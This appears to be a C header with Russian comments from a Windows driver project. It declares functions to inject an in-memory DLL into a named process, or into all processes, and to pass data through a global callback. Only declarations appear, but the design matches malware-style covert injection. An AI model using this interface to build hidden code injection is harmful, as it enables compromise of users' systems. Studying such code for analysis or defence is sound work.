#ifndef __Driver_Connect___
#define __Driver_Connect___

#define IO_CONTROL_DRIVER_NULL								0
#define IO_CONTROL_DRIVER_LOAD_MODULE						1
#define IO_CONTROL_DRIVER_REMOVE_MODULE						2
#define IO_CONTROL_DRIVER_REGISTER_GLOBALCALLBACK			3
#define IO_CONTROL_DRIVER_SEND_DATA_TO_GLOBALCALLBACK		4
#define IO_CONTROL_DRIVER_CHEK_PROCESS						5


typedef struct __USER_INIT_NOTIFY{
	PVOID pInfoNotifyArea;				//	указатель куда нуно писать данные драйверу
	ULONG AreaSize;						//	 размер области
	HANDLE hQueryEvent;					// евент для обращения к драйверу
}USER_INIT_NOTIFY,*PUSER_INIT_NOTIFY;

typedef struct __BUFFER_DATA
{
	PVOID	 Buffer;
	ULONG	 Size;
}BUFFER_DATA,*PBUFFER_DATA;

typedef VOID(WINAPI * TGlobalCallBack) (PVOID Reserved,PBUFFER_DATA Data,PVOID lParam);

//
//	puin			- значение переданное в процедуру Notify 
//	Module			- указатель длл в памяти
//  TargetProcess	- имя процесса в который нужно внедрить, если NULL то во все процессы.
//  size			- размер длл в памяти
//  Flags			- зарезервировано
PVOID DriverAddInjectModule(PUSER_INIT_NOTIFY puin, PVOID Module,PCHAR TargetProcess,ULONG size,ULONG Flags);



//
//  Убирает запрещает инжект в процесс
//	ProcessName	-	имя процесса
//	возвращает TRUE если все хорошо.
//
BOOL DriverRemoveInjectToProcess(PUSER_INIT_NOTIFY puin,PWCHAR ProcessName);

//
//	регистрирует GlobalCallback
//	ThreadId - поток в котором будет вызывать CallBack процедура	
//	CallBack - CallBack процедура
//	lParam	 -	дополнительный параметр, передается в CallBack
BOOL DriverRegisterGlobalCallback (PUSER_INIT_NOTIFY puin ,DWORD ThreadId,TGlobalCallBack CallBack,LPVOID lParam);


//
//	Посылает данные в GlobalCallBack
//	Memory			-	Указатель на данные
//	SizeMemory		-	Размер памяти
BOOL DriverSendDataToGlobalCallBack(PUSER_INIT_NOTIFY puin, PVOID Memory, ULONG SizeMemory);


//
//	Проверяет будет ли инжектится в указанный процесс, какая либо длл
//	uProcessName	-	имя процесса
//
BOOL CheckIsInjectToProcess(PUSER_INIT_NOTIFY puin, PWCHAR uProcessName);

#endif